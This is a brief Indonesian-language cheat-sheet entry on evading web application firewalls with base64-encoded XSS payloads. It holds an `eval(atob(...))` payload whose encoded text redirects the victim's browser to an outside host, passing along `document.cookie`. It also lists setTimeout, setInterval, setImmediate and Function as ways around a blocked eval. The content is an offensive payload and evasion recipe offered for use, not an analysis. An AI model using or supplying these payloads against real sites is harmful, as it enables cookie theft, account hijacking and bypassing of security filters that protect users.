# Base64 Encode Evasion
biasanya digunakan untuk menghindari block dari waf terhadapat payload javascript seperti eval, alert, prompt, document.cookie dan lainnya.

## XSS
<img width="500" alt="image" src="https://user-images.githubusercontent.com/52058660/161191171-59b6d3df-a4a2-496c-b61b-c64cc44aec56.png"><br>
sehingga<br>
`eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRw0i8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))`<br>
dapat dilihat bahwa eval akan diblock oleh WAF sehingga mencari alternativenya menggunak payload berikut<br>
<img width="500" src="https://user-images.githubusercontent.com/52058660/161191520-a3c5e394-b576-408e-89d4-a55a57cd95c2.png"><br>
```
setTimeout("code") #allbrowser
setInterval("code") #allbrowser
setImmediate("code") #IE10
Function("code")() #allbrowser
```

